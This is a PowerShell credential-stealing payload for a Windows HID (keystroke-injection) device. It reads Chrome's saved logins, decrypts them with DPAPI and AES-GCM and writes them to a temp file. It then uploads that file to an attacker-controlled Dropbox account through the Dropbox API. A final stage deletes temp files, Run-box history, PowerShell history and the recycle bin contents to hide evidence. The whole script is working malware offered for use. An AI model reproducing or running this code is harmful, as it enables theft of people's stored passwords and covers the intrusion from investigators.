#########################################################################################################
#                                                               |                                       #
# Title        : Browser-Passwords-Dropbox-Exfiltration         |   ____ _____   ______                 #
# Author       : DIYS.py                                        |  |  _ \_ _\ \ / / ___|  _ __  _   _   #
# Version      : 1.0                                            |  | | | | | \ V /\___ \ | '_ \| | | |  #
# Category     : Credentials, Exfiltration                      |  | |_| | |  | |  ___) || |_) | |_| |  #
# Target       : Windows 10                                     |  |____/___| |_| |____(_) .__/ \__, |  #
# Mode         : HID                                            |                        |_|    |___/   #
# Props        : I am Jakoby, NULLSESSION0X                     |                                       #
#                                                               |                                       # 
#########################################################################################################

<#
.SYNOPSIS
	This script exfiltrates credentials from the browser via Dropbox.
.DESCRIPTION 
	Checkes and saves the credentials from the Chrome browser, then connects to Dropbox and uploads
    the file containing all of the loot.
.Link
	https://developers.dropbox.com/oauth-guide		# Guide for setting up your DropBox for uploads
#>

$DropBoxAccessToken = "YOUR-DROPBOX-ACCESS-TOKEN"

$FileName = "$env:USERNAME-$(get-date -f yyyy-MM-dd_hh-mm)_User-Creds.txt"

#Stage 1 Obtain the credentials from the Chrome browsers User Data folder

#First we Kill Chrome just to be safe
Stop-Process -Name Chrome

$d=Add-Type -A System.Security
$p='public static'
$g=""")]$p extern"
$i='[DllImport("winsqlite3",EntryPoint="sqlite3_'
$m="[MarshalAs(UnmanagedType.LP"
$q='(s,i)'
$f='(p s,int i)'
$z=$env:LOCALAPPDATA+'\Google\Chrome\User Data'
$u=[Security.Cryptography.ProtectedData]
Add-Type "using System.Runtime.InteropServices;using p=System.IntPtr;$p class W{$($i)open$g p O($($m)Str)]string f,out p d);$($i)prepare16_v2$g p P(p d,$($m)WStr)]string l,int n,out p s,p t);$($i)step$g p S(p s);$($i)column_text16$g p C$f;$($i)column_bytes$g int Y$f;$($i)column_blob$g p L$f;$p string T$f{return Marshal.PtrToStringUni(C$q);}$p byte[] B$f{var r=new byte[Y$q];Marshal.Copy(L$q,r,0,Y$q);return r;}}"
$s=[W]::O("$z\\Default\\Login Data",[ref]$d)
$l=@()
if($host.Version-like"7*"){$b=(gc "$z\\Local State"|ConvertFrom-Json).os_crypt.encrypted_key
$x=[Security.Cryptography.AesGcm]::New($u::Unprotect([Convert]::FromBase64String($b)[5..($b.length-1)],$n,0))}$_=[W]::P($d,"SELECT*FROM logins WHERE blacklisted_by_user=0",-1,[ref]$s,0)
for(;!([W]::S($s)%100)){$l+=[W]::T($s,0),[W]::T($s,3)
$c=[W]::B($s,5)
try{$e=$u::Unprotect($c,$n,0)}catch{if($x){$k=$c.length
$e=[byte[]]::new($k-31)
$x.Decrypt($c[3..14],$c[15..($k-17)],$c[($k-16)..($k-1)],$e)}}$l+=($e|%{[char]$_})-join''}
#After Decrypting the contents of the files, save them to a file in the temp folder.

echo $l >> $env:TMP\$FileName

#Start Chrome again

$pathToChrome = 'C:\Program Files (x86)\Google\Chrome\Application\chrome.exe'
Start-Process -FilePath $pathToChrome

#Stage 2 Upload them to Dropbox

<#
.NOTES 
	This is to upload your files to dropbox
#>

$TargetFilePath="/$FileName"
$SourceFilePath="$env:TMP\$FileName"
$arg = '{ "path": "' + $TargetFilePath + '", "mode": "add", "autorename": true, "mute": false }'
$authorization = "Bearer " + $DropBoxAccessToken
$headers = New-Object "System.Collections.Generic.Dictionary[[String],[String]]"
$headers.Add("Authorization", $authorization)
$headers.Add("Dropbox-API-Arg", $arg)
$headers.Add("Content-Type", 'application/octet-stream')
Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Post -InFile $SourceFilePath -Headers $headers


#Stage 3 Cleanup Traces

<#
.NOTES 
	This is to clean up behind you and remove any evidence to prove you were there
#>

# Delete contents of Temp folder 

rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue

# Delete run box history

reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f

# Delete powershell history

Remove-Item (Get-PSreadlineOption).HistorySavePath

# Deletes contents of recycle bin

Clear-RecycleBin -Force -ErrorAction SilentlyContinue

exit
